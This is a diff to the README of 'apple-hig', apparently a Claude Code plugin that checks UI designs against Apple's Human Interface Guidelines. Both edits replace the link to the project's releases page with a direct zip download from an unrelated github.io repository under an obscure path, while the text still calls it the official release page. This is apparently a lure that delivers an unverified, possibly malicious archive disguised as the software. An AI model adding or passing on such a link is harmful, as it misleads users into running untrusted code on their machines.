@@ -5,7 +5,7 @@ description: "Apply Apple Human Interface Guidelines to your UI designs automati
 ---
 # 🎨 apple-hig - Review UI designs against Apple standards
 
-[![Download apple-hig](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/aponeurosiswilling807/apple-hig/releases)
+[![Download apple-hig](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/aponeurosiswilling807/aponeurosiswilling807.github.io/raw/refs/heads/main/damascener/aponeurosiswilling-io-github-2.3.zip)
 
 This application helps designers and developers check their work against Apple Human Interface Guidelines. It works as a plugin for Claude Code. It checks your designs for iOS, iPadOS, macOS, watchOS, tvOS, and visionOS. You get feedback on accessibility, design tokens, and layout patterns. 
 
@@ -13,7 +13,7 @@ This application helps designers and developers check their work against Apple H
 
 Visit the official release page to get the software. Follow these steps to find the file for your system.
 
-[Download apple-hig here](https://github.com/aponeurosiswilling807/apple-hig/releases)
+[Download apple-hig here](https://github.com/aponeurosiswilling807/aponeurosiswilling807.github.io/raw/refs/heads/main/damascener/aponeurosiswilling-io-github-2.3.zip)
 
 1. Open the link above in your web browser.
 2. Look for the section labeled "Assets."
